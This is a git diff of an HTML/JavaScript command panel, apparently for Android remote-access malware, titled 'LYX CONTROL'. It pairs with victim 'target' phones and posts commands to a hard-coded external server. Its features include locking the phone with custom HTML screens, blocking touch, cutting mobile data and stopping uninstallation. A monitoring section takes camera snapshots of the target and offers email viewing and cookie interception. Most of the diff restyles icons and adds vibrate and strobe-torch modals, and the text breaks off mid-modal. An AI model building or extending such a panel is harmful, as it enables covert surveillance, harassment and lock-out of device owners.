@@ -7,92 +7,79 @@
 <style>
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
   body {
-    background: #0a0a0a;
-    min-height: 100vh;
-    color: #fff;
-    padding: 15px;
-    padding-bottom: 40px;
+    background: #0a0a0a; min-height: 100vh; color: #fff;
+    padding: 15px; padding-bottom: 40px;
   }
 
-  .header {
+  /* LOGO SVG */
+  .logo-header {
     text-align: center;
     margin-bottom: 20px;
-    padding: 15px;
+    padding: 20px 15px;
     background: linear-gradient(135deg, #1a0000, #0a0a0a);
     border-radius: 15px;
     border: 1px solid #cc0000;
     box-shadow: 0 0 25px #cc000033;
   }
-  .header h1 {
-    font-size: 20px;
-    color: #ff2222;
-    letter-spacing: 3px;
-    text-shadow: 0 0 15px #ff0000;
+  .logo-svg {
+    width: 80px; height: 80px;
+    display: block;
+    margin: 0 auto 10px;
+    filter: drop-shadow(0 0 15px #ff0000);
+    animation: logoPulse 2.5s infinite;
+  }
+  @keyframes logoPulse {
+    0%, 100% { filter: drop-shadow(0 0 15px #ff0000); }
+    50% { filter: drop-shadow(0 0 25px #ff0000) drop-shadow(0 0 40px #990000); }
+  }
+  .logo-title {
+    font-size: 20px; color: #ff2222;
+    letter-spacing: 4px; text-shadow: 0 0 15px #ff0000;
     font-weight: 900;
   }
-  .header p { font-size: 11px; color:#888; margin-top:4px; letter-spacing:1px; }
+  .logo-sub {
+    font-size: 10px; color: #888;
+    margin-top: 4px; letter-spacing: 2px;
+  }
 
   .card {
-    background: #111;
-    border: 1px solid #333;
-    border-radius: 12px;
-    padding: 15px;
-    margin-bottom: 15px;
+    background: #111; border: 1px solid #333;
+    border-radius: 12px; padding: 15px; margin-bottom: 15px;
   }
   .card h2 {
-    font-size: 14px;
-    color: #ff3333;
-    margin-bottom: 10px;
-    letter-spacing: 1px;
-    border-bottom: 1px dashed #333;
-    padding-bottom: 8px;
+    font-size: 14px; color: #ff3333;
+    margin-bottom: 10px; letter-spacing: 1px;
+    border-bottom: 1px dashed #333; padding-bottom: 8px;
   }
   .pairing-box { display: flex; gap: 8px; flex-wrap: wrap; }
   .pairing-code {
-    flex: 1;
-    min-width: 180px;
-    background: #000;
-    border: 1px solid #cc0000;
-    border-radius: 8px;
-    padding: 10px;
-    font-family: 'Courier New', monospace;
-    font-size: 16px;
-    letter-spacing: 4px;
-    text-align: center;
-    color: #00ffcc;
+    flex: 1; min-width: 180px; background: #000;
+    border: 1px solid #cc0000; border-radius: 8px;
+    padding: 10px; font-family: 'Courier New', monospace;
+    font-size: 16px; letter-spacing: 4px;
+    text-align: center; color: #00ffcc;
     text-shadow: 0 0 8px #00ffcc88;
   }
 
   .btn {
     background: linear-gradient(135deg, #cc0000, #660000);
-    border: none;
-    color: #fff;
-    padding: 10px 16px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: bold;
-    font-size: 12px;
-    letter-spacing: 1px;
-    transition: all 0.2s;
-    box-shadow: 0 0 12px #cc000066;
+    border: none; color: #fff; padding: 10px 16px;
+    border-radius: 8px; cursor: pointer; font-weight: bold;
+    font-size: 12px; letter-spacing: 1px;
+    transition: all 0.2s; box-shadow: 0 0 12px #cc000066;
   }
   .btn:hover { transform: translateY(-1px); box-shadow: 0 0 18px #cc0000aa; }
   .btn:active { transform: scale(0.97); }
   .btn.green { background: linear-gradient(135deg, #008844, #00cc66); }
   .btn.dark { background: linear-gradient(135deg, #222, #111); border:1px solid #444; }
-  .btn.full { width:100%; }
+  .btn.yellow { background: linear-gradient(135deg, #cc9900, #ffcc00); color:#000; }
 
   .device-list { display: flex; flex-direction: column; gap: 10px; }
   .device-item {
     background: linear-gradient(135deg, #1a0000, #0a0a0a);
-    border: 1px solid #cc000055;
-    border-radius: 10px;
-    padding: 12px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 10px;
-    flex-wrap: wrap;
+    border: 1px solid #cc000055; border-radius: 10px;
+    padding: 12px; display: flex; justify-content: space-between;
+    align-items: center; gap: 10px; flex-wrap: wrap;
   }
   .device-info { display: flex; align-items: center; gap: 10px; flex:1; min-width: 180px; }
   .device-icon { font-size: 24px; }
@@ -102,12 +89,15 @@
   .status-on::before { content: "● "; }
 
   .section-title {
-    font-size: 12px;
-    color: #ff3333;
-    letter-spacing: 2px;
-    margin: 20px 0 10px;
-    padding-left: 5px;
-    border-left: 3px solid #cc0000;
+    font-size: 12px; color: #ff3333;
+    letter-spacing: 2px; margin: 20px 0 10px;
+    padding-left: 5px; border-left: 3px solid #cc0000;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .section-title svg {
+    width: 16px; height: 16px;
+    fill: #ff3333;
+    filter: drop-shadow(0 0 4px #ff0000);
   }
 
   .control-grid {
@@ -121,13 +111,9 @@
 
   .control-card {
     background: linear-gradient(135deg, #111, #0a0a0a);
-    border: 1px solid #2a0000;
-    border-radius: 12px;
-    padding: 15px 8px;
-    text-align: center;
-    cursor: pointer;
-    transition: all 0.25s;
-    position: relative;
+    border: 1px solid #2a0000; border-radius: 12px;
+    padding: 15px 8px; text-align: center;
+    cursor: pointer; transition: all 0.25s; position: relative;
   }
   .control-card:hover {
     border-color: #cc0000;
@@ -137,133 +123,167 @@
   .control-card:active { transform: scale(0.96); }
 
   .control-icon {
-    width: 40px;
-    height: 40px;
+    width: 44px; height: 44px;
     margin: 0 auto 10px;
-    border: 2px solid #cc0000;
-    border-radius: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #ff2222;
-    font-size: 20px;
-    background: #0a0000;
+    border: 2px solid #cc0000; border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    background: #0a0000; position: relative;
+  }
+  .control-icon svg {
+    width: 24px; height: 24px;
+    fill: none;
+    stroke: #ff2222;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    filter: drop-shadow(0 0 4px #ff0000);
   }
 
   .control-title {
-    font-size: 11px;
-    color: #fff;
-    font-weight: bold;
-    letter-spacing: 0.5px;
-    margin-bottom: 4px;
+    font-size: 11px; color: #fff; font-weight: bold;
+    letter-spacing: 0.5px; margin-bottom: 4px;
   }
-
-  .control-desc {
-    font-size: 9px;
-    color: #666;
-    line-height: 1.3;
-  }
-
+  .control-desc { font-size: 9px; color: #666; line-height: 1.3; }
   .dot-online {
-    position: absolute;
-    top: 8px;
-    right: 8px;
-    width: 6px;
-    height: 6px;
-    background: #ff0000;
-    border-radius: 50%;
-    box-shadow: 0 0 8px #ff0000;
+    position: absolute; top: 8px; right: 8px;
+    width: 6px; height: 6px; background: #ff0000;
+    border-radius: 50%; box-shadow: 0 0 8px #ff0000;
   }
 
   .modal {
-    display: none;
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: rgba(0,0,0,0.85);
-    z-index: 9999;
-    align-items: center;
-    justify-content: center;
-    padding: 15px;
+    display: none; position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(0,0,0,0.85); z-index: 9999;
+    align-items: center; justify-content: center; padding: 15px;
   }
   .modal.show { display: flex; }
-
   .modal-content {
-    background: #111;
-    border: 1px solid #cc0000;
-    border-radius: 15px;
-    padding: 20px;
-    width: 100%;
-    max-width: 420px;
-    max-height: 90vh;
-    overflow-y: auto;
+    background: #111; border: 1px solid #cc0000;
+    border-radius: 15px; padding: 20px;
+    width: 100%; max-width: 420px;
+    max-height: 90vh; overflow-y: auto;
     box-shadow: 0 0 40px #cc000066;
   }
   .modal-content h3 {
-    color: #ff3333;
-    font-size: 16px;
-    margin-bottom: 15px;
-    letter-spacing: 1px;
-    border-bottom: 1px solid #333;
+    color: #ff3333; font-size: 16px; margin-bottom: 15px;
+    letter-spacing: 1px; border-bottom: 1px solid #333;
     padding-bottom: 10px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .modal-content h3 svg {
+    width: 20px; height: 20px;
+    fill: none; stroke: #ff3333; stroke-width: 2;
   }
   label {
-    font-size: 11px;
-    color: #ff6666;
-    display: block;
-    margin: 12px 0 6px;
-    letter-spacing: 1px;
-    text-transform: uppercase;
+    font-size: 11px; color: #ff6666; display: block;
+    margin: 12px 0 6px; letter-spacing: 1px; text-transform: uppercase;
   }
   input[type=text], input[type=number], textarea, select {
-    width: 100%;
-    background: #000;
-    border: 1px solid #333;
-    border-radius: 8px;
-    padding: 10px;
-    color: #fff;
-    font-size: 13px;
+    width: 100%; background: #000;
+    border: 1px solid #333; border-radius: 8px;
+    padding: 10px; color: #fff; font-size: 13px;
     font-family: 'Courier New', monospace;
   }
   input:focus, textarea:focus, select:focus {
-    outline: none;
-    border-color: #cc0000;
+    outline: none; border-color: #cc0000;
     box-shadow: 0 0 10px #cc000066;
   }
   textarea { min-height: 100px; resize: vertical; }
   .modal-actions { display: flex; gap: 8px; margin-top: 18px; }
   .modal-actions .btn { flex: 1; }
 
+  .slider-wrap { display: flex; align-items: center; gap: 10px; margin-top: 8px; }
+  input[type=range] {
+    flex: 1; -webkit-appearance: none; height: 6px;
+    background: linear-gradient(90deg, #cc0000, #ffcc00);
+    border-radius: 3px; outline: none;
+  }
+  input[type=range]::-webkit-slider-thumb {
+    -webkit-appearance: none; width: 20px; height: 20px;
+    background: #fff; border: 2px solid #cc0000;
+    border-radius: 50%; cursor: pointer; box-shadow: 0 0 10px #cc0000;
+  }
+  .slider-value {
+    min-width: 60px; text-align: center;
+    font-family: monospace; font-size: 13px;
+    color: #ffcc00; background: #000;
+    padding: 4px 8px; border-radius: 6px; border: 1px solid #333;
+  }
+  .preset-grid {
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 6px; margin-top: 8px;
+  }
+  .preset-btn {
+    background: #0a0000; border: 1px solid #333;
+    border-radius: 6px; padding: 8px 4px;
+    font-size: 11px; color: #ff8888;
+    cursor: pointer; text-align: center;
+    font-family: monospace; transition: 0.2s;
+  }
+  .preset-btn:hover {
+    background: #330000; border-color: #cc0000; color: #fff;
+  }
   .toast {
-    position: fixed;
-    bottom: 25px;
-    left: 50%;
+    position: fixed; bottom: 25px; left: 50%;
     transform: translateX(-50%) translateY(100px);
     background: linear-gradient(135deg, #cc0000, #660000);
-    color: #fff;
-    padding: 12px 22px;
-    border-radius: 10px;
-    font-size: 12px;
-    font-weight: bold;
-    box-shadow: 0 0 25px #cc000088;
-    opacity: 0;
-    transition: all 0.3s;
-    z-index: 99999;
-    max-width: 90vw;
-    text-align: center;
+    color: #fff; padding: 12px 22px; border-radius: 10px;
+    font-size: 12px; font-weight: bold;
+    box-shadow: 0 0 25px #cc000088; opacity: 0;
+    transition: all 0.3s; z-index: 99999;
+    max-width: 90vw; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
   .toast.success { background: linear-gradient(135deg, #008844, #00cc66); }
+
+  /* Warning badge untuk fitur terbatas */
+  .limited-badge {
+    position: absolute; top: -5px; right: -5px;
+    background: #ffaa00; color: #000;
+    font-size: 8px; font-weight: bold;
+    padding: 2px 5px; border-radius: 8px;
+    box-shadow: 0 0 8px #ffaa00;
+  }
 </style>
 </head>
 <body>
 
-<div class="header">
-  <h1>☠ LYX CONTROL PANEL ☠</h1>
-  <p>CYBERPUNK EDITION · MADE BY ZAMZZZ</p>
+<!-- HEADER DENGAN LOGO SVG -->
+<div class="logo-header">
+  <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <!-- Lingkaran luar -->
+    <circle cx="50" cy="50" r="45" fill="none" stroke="#cc0000" stroke-width="2" opacity="0.5"/>
+    <circle cx="50" cy="50" r="38" fill="none" stroke="#ff0000" stroke-width="1" opacity="0.3"/>
+    <!-- Tengkorak SVG -->
+    <g fill="none" stroke="#ff2222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <!-- Kepala -->
+      <path d="M 32 35 Q 32 20 50 20 Q 68 20 68 35 L 68 48 Q 68 55 62 58 L 62 65 L 38 65 L 38 58 Q 32 55 32 48 Z"/>
+      <!-- Mata kiri -->
+      <ellipse cx="42" cy="40" rx="4" ry="5" fill="#ff2222"/>
+      <!-- Mata kanan -->
+      <ellipse cx="58" cy="40" rx="4" ry="5" fill="#ff2222"/>
+      <!-- Hidung -->
+      <path d="M 48 48 L 50 52 L 52 48"/>
+      <!-- Mulut -->
+      <path d="M 42 58 L 58 58"/>
+      <line x1="44" y1="58" x2="44" y2="62"/>
+      <line x1="48" y1="58" x2="48" y2="62"/>
+      <line x1="52" y1="58" x2="52" y2="62"/>
+      <line x1="56" y1="58" x2="56" y2="62"/>
+      <!-- Taring -->
+      <path d="M 40 65 L 40 70 M 60 65 L 60 70"/>
+      <!-- Salib bawah -->
+      <line x1="50" y1="72" x2="50" y2="85"/>
+      <line x1="45" y1="77" x2="55" y2="77"/>
+    </g>
+    <!-- Efek glow -->
+    <circle cx="50" cy="50" r="45" fill="none" stroke="#ff0000" stroke-width="0.5" opacity="0.8"/>
+  </svg>
+  <div class="logo-title">LYX CONTROL</div>
+  <div class="logo-sub">CYBERPUNK EDITION · ZAMZZZ SYSTEM</div>
 </div>
 
+<!-- PAIRING -->
 <div class="card">
   <h2>🔑 Code Pairing</h2>
   <div class="pairing-box">
@@ -273,6 +293,7 @@
   </div>
 </div>
 
+<!-- DEVICE LIST -->
 <div class="card">
   <h2>📱 List Device <span id="deviceCount" style="color:#00ff88; font-size:11px;">(0)</span></h2>
   <div class="device-list" id="deviceList">
@@ -284,101 +305,171 @@
 <div class="card" id="controlPanel" style="display:none;">
   <h2 id="controlTitle">🎯 Control Device</h2>
 
-  <div class="section-title">⚡ KONTROL UTAMA</div>
+  <!-- KONTROL UTAMA -->
+  <div class="section-title">
+    <svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    KONTROL UTAMA
+  </div>
   <div class="control-grid">
     <div class="control-card" onclick="openModal('reconnect')">
       <div class="dot-online"></div>
-      <div class="control-icon">↻</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+      </div>
       <div class="control-title">Connect Ulang</div>
       <div class="control-desc">Reconnect Target</div>
     </div>
     <div class="control-card" onclick="openModal('lock')">
       <div class="dot-online"></div>
-      <div class="control-icon">🔒</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      </div>
       <div class="control-title">Lock HP</div>
       <div class="control-desc">HTML Cyberpunk Lock</div>
     </div>
     <div class="control-card" onclick="sendCommand('unlock')">
       <div class="dot-online"></div>
-      <div class="control-icon">🔓</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
+      </div>
       <div class="control-title">Unlock HP</div>
       <div class="control-desc">Buka Kunci</div>
     </div>
     <div class="control-card" onclick="openModal('lockhtml')">
       <div class="dot-online"></div>
-      <div class="control-icon">📝</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+      </div>
       <div class="control-title">Lock Custom HTML</div>
       <div class="control-desc">Template HTML Lock</div>
     </div>
     <div class="control-card" onclick="openModal('text')">
       <div class="dot-online"></div>
-      <div class="control-icon">💬</div>
-      <div class="control-title">Kirim Teks Layar</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+      </div>
+      <div class="control-title">Kirim Teks</div>
       <div class="control-desc">Tulis Pesan</div>
     </div>
     <div class="control-card" onclick="sendCommand('antiuninstall')">
       <div class="dot-online"></div>
-      <div class="control-icon">🛡</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
       <div class="control-title">Anti Uninstall</div>
       <div class="control-desc">Lindungi Aplikasi</div>
     </div>
     <div class="control-card" onclick="sendCommand('blocktouch')">
       <div class="dot-online"></div>
-      <div class="control-icon">✋</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M18 11V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v5"/><path d="M14 10V4a2 2 0 0 0-2-2 2 2 0 0 0-2 2v6"/><path d="M10 10.5V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v8"/><path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/></svg>
+      </div>
       <div class="control-title">Block Touch</div>
-      <div class="control-desc">Bekukan Layar Target</div>
+      <div class="control-desc">Bekukan Layar</div>
     </div>
     <div class="control-card" onclick="sendCommand('unlocktouch')">
       <div class="dot-online"></div>
-      <div class="control-icon">🖐</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M18 11V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v5"/><path d="M14 10V4a2 2 0 0 0-2-2 2 2 0 0 0-2 2v6"/><path d="M10 10.5V6a2 2 0 0 0-2-2 2 2 0 0 0-2 2v8"/><path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/><line x1="2" y1="2" x2="22" y2="22" stroke-dasharray="2 2"/></svg>
+      </div>
       <div class="control-title">Unlock Touch</div>
       <div class="control-desc">Bebaskan Layar</div>
     </div>
     <div class="control-card" onclick="sendCommand('killdata')">
       <div class="dot-online"></div>
-      <div class="control-icon">📵</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><rect x="2" y="7" width="20" height="10" rx="2"/><line x1="6" y1="11" x2="6" y2="13"/><line x1="18" y1="11" x2="18" y2="13"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+      </div>
       <div class="control-title">Kill Data</div>
       <div class="control-desc">Matikan Data Target</div>
     </div>
   </div>
 
-  <div class="section-title">🔥 FITUR TAMBAHAN</div>
+  <!-- FITUR TAMBAHAN -->
+  <div class="section-title">
+    <svg viewBox="0 0 24 24"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/></svg>
+    FITUR TAMBAHAN
+  </div>
   <div class="control-grid">
-    <div class="control-card" onclick="sendCommand('flashon')">
+    <div class="control-card" onclick="openModal('flash')">
       <div class="dot-online"></div>
-      <div class="control-icon">⚡</div>
-      <div class="control-title">Nyatakan Flash</div>
-      <div class="control-desc">Nyalakan Lampu Senter</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      </div>
+      <div class="control-title">Senter Custom</div>
+      <div class="control-desc">Kedip / Durasi</div>
     </div>
-    <div class="control-card" onclick="sendCommand('flashoff')">
+    <div class="control-card" onclick="openModal('flashbackground')">
       <div class="dot-online"></div>
-      <div class="control-icon">⚡</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      </div>
+      <div class="control-title">Senter BG</div>
+      <div class="control-desc">Nyala walau app lain</div>
+    </div>
+    <div class="control-card" onclick="openModal('flashoff2')">
+      <div class="dot-online"></div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+      </div>
       <div class="control-title">Matikan Flash</div>
-      <div class="control-desc">Matikan Lampu Senter</div>
+      <div class="control-desc">Matikan Senter</div>
     </div>
     <div class="control-card" onclick="openModal('website')">
       <div class="dot-online"></div>
-      <div class="control-icon">🌐</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+      </div>
       <div class="control-title">Buka Website</div>
-      <div class="control-desc">Ketik URL Website</div>
-    </div>
-    <div class="control-card" onclick="sendCommand('showicon')">
-      <div class="dot-online"></div>
-      <div class="control-icon">👁</div>
-      <div class="control-title">Show Icon</div>
-      <div class="control-desc">Munculkan Aplikasi Target</div>
+      <div class="control-desc">Ketik URL</div>
     </div>
     <div class="control-card" onclick="openModal('music')">
       <div class="dot-online"></div>
-      <div class="control-icon">🎵</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+      </div>
       <div class="control-title">Putar Musik</div>
       <div class="control-desc">Ketik URL MP3</div>
     </div>
     <div class="control-card" onclick="openModal('vibrate')">
       <div class="dot-online"></div>
-      <div class="control-icon">📳</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><rect x="9" y="3" width="6" height="18" rx="2"/><line x1="2" y1="9" x2="5" y2="9"/><line x1="2" y1="12" x2="5" y2="12"/><line x1="2" y1="15" x2="5" y2="15"/><line x1="19" y1="9" x2="22" y2="9"/><line x1="19" y1="12" x2="22" y2="12"/><line x1="19" y1="15" x2="22" y2="15"/></svg>
+      </div>
       <div class="control-title">Getar</div>
-      <div class="control-desc">Durasi (ms)</div>
+      <div class="control-desc">Max 20x</div>
+    </div>
+  </div>
+
+  <!-- FITUR SPY / MONITORING -->
+  <div class="section-title">
+    <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+    MONITORING
+  </div>
+  <div class="control-grid">
+    <div class="control-card" onclick="openModal('livecamera')">
+      <div class="dot-online"></div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+      </div>
+      <div class="control-title">Live Camera</div>
+      <div class="control-desc">Snap Foto Target</div>
+    </div>
+    <div class="control-card" onclick="openModal('email')">
+      <div class="limited-badge">LIMITED</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+      </div>
+      <div class="control-title">Liat EMAIL</div>
+      <div class="control-desc">Kirim notif buka email</div>
+    </div>
+    <div class="control-card" onclick="openModal('cookies')">
+      <div class="limited-badge">LIMITED</div>
+      <div class="control-icon">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="8" cy="9" r="1.5" fill="#ff2222"/><circle cx="15" cy="8" r="1" fill="#ff2222"/><circle cx="16" cy="14" r="1.5" fill="#ff2222"/><circle cx="9" cy="15" r="1" fill="#ff2222"/></svg>
+      </div>
+      <div class="control-title">Sadap Cookies</div>
+      <div class="control-desc">Kirim notif cookies</div>
     </div>
   </div>
 </div>
@@ -390,13 +481,11 @@
 <div class="toast" id="toast">Berhasil!</div>
 
 <script>
-/* ==================== CONFIG ==================== */
 const API_BASE = "https://lyx-server-production-38a0.up.railway.app";
 
 let devices = JSON.parse(localStorage.getItem('lyx_devices') || '[]');
 let currentDeviceId = null;
 
-/* ==================== TOAST ==================== */
 function showToast(msg, success=false) {
   const t = document.getElementById('toast');
   t.textContent = msg;
@@ -404,13 +493,11 @@ function showToast(msg, success=false) {
   setTimeout(() => t.className = 'toast', 2500);
 }
 
-/* ==================== PAIRING ==================== */
 function generateCode() {
   const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
   let code = '';
   for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
   document.getElementById('pairingCode').value = code;
-
   fetch(API_BASE + '/api/generate-pairing', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -427,17 +514,14 @@ function copyCode() {
   showToast('Code dicopy!', true);
 }
 
-/* ==================== RENDER ==================== */
 function renderDevices() {
   const list = document.getElementById('deviceList');
   const count = document.getElementById('deviceCount');
   count.textContent = '(' + devices.length + ')';
-
   if (devices.length === 0) {
     list.innerHTML = '<p style="text-align:center; color:#666; font-size:11px; padding:15px;">Belum ada perangkat terhubung.</p>';
     return;
   }
-
   list.innerHTML = devices.map(d => `
     <div class="device-item">
       <div class="device-info">
@@ -472,20 +556,17 @@ function selectDevice(id) {
   currentDeviceId = id;
   const d = devices.find(x => x.id === id);
   if (!d) return;
-
   document.getElementById('controlTitle').textContent = '🎯 ' + d.name;
   document.getElementById('controlPanel').style.display = 'block';
   document.getElementById('controlPanel').scrollIntoView({ behavior: 'smooth' });
 }
 
-/* ==================== SEND COMMAND ==================== */
 function sendCommand(type, extra = {}) {
   if (!currentDeviceId) { showToast('Pilih device dulu!'); return; }
-
   fetch(API_BASE + '/api/command', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ deviceId: currentDeviceId, type, ...extra })
+    body: JSON.stringify(Object.assign({ deviceId: currentDeviceId, type }, extra))
   })
   .then(r => r.json())
   .then(res => {
@@ -495,10 +576,8 @@ function sendCommand(type, extra = {}) {
   .catch(() => showToast('Server tidak terjangkau'));
 }
 
-/* ==================== MODAL ==================== */
 function openModal(type) {
   if (!currentDeviceId) { showToast('Pilih device dulu!'); return; }
-
   const modal = document.getElementById('modal');
   const content = document.getElementById('modalContent');
   let html = '';
@@ -562,12 +641,149 @@ function openModal(type) {
       </div>`;
   } else if (type === 'vibrate') {
     html = `
-      <h3>📳 Getar</h3>
-      <label>Durasi (milidetik)</label>
-      <input type="number" id="vibDur" placeholder="1000" value="1000">
+      <h3>📳 Getar Custom</h3>
+      <label>Jumlah Getar (1-20)</label>
+      <div class="slider-wrap">
+        <input type="range" id="vibSlider" min="1" max="20" value="5" oninput="updateVibLabel()">
+        <div class="slider-value" id="vibLabel">5x</div>
+      </div>
+      <label>Preset</label>
+      <div class="preset-grid">
+        <div class="preset-btn" onclick="setVibPreset(1)">1x</div>
+        <div class="preset-btn" onclick="setVibPreset(3)">3x</div>
+        <div class="preset-btn" onclick="setVibPreset(5)">5x</div>
+        <div class="preset-btn" onclick="setVibPreset(10)">10x</div>
+        <div class="preset-btn" onclick="setVibPreset(15)">15x</div>
+        <div class="preset-btn" onclick="setVibPreset(20)">20x</div>
+      </div>
+      <label>Interval (ms)</label>
+      <div class="slider-wrap">
+        <input type="range" id="vibInterval" min="50" max="1000" value="300" step="50" oninput="updateIntLabel()">
+        <div class="slider-value" id="intLabel">300ms</div>
+      </div>
+      <label>Durasi tiap getar (ms)</label>
+      <div class="slider-wrap">
+        <input type="range" id="vibDur" min="50" max="2000" value="500" step="50" oninput="updateDurLabel()">
+        <div class="slider-value" id="durLabel">500ms</div>
+      </div>
       <div class="modal-actions">
         <button class="btn dark" onclick="closeModal()">Batal</button>
-        <button class="btn" onclick="submitVibrate()">📳 Getar</button>
+        <button class="btn yellow" onclick="submitVibrate()">📳 Getar</button>
+      </div>`;
+  } else if (type === 'flash') {
+    html = `
+      <h3>⚡ Senter Custom</h3>
+      <label>Mode Senter</label>
+      <select id="flashMode" onchange="toggleFlashMode()">
+        <option value="on">Nyalakan (terus)</option>
+        <option value="off">Matikan</option>
+        <option value="blink">Kedip Cepat (Strobe)</option>
+        <option value="pattern">Pola Custom</option>
+      </select>
+      <div id="flashBlinkConfig" style="display:none;">
+        <label>Kecepatan Kedip (ms)</label>
+        <div class="slider-wrap">
+          <input type="range" id="blinkSpeed" min="50" max="1000" value="200" step="10" oninput="updateBlinkLabel()">
+          <div class="slider-value" id="blinkLabel">200ms</div>
+        </div>
+        <label>Jumlah Kedipan (1-20)</label>
+        <div class="slider-wrap">
+          <input type="range" id="blinkCount" min="1" max="20" value="10" oninput="updateBlinkCountLabel()">
+          <div class="slider-value" id="blinkCountLabel">10x</div>
+        </div>
+        <label>Preset Cepat</label>
+        <div class="preset-grid">
+          <div class="preset-btn" onclick="setBlinkPreset(100, 20)">Hyper</div>
+          <div class="preset-btn" onclick="setBlinkPreset(200, 10)">Cepat</div>
+          <div class="preset-btn" onclick="setBlinkPreset(400, 8)">Sedang</div>
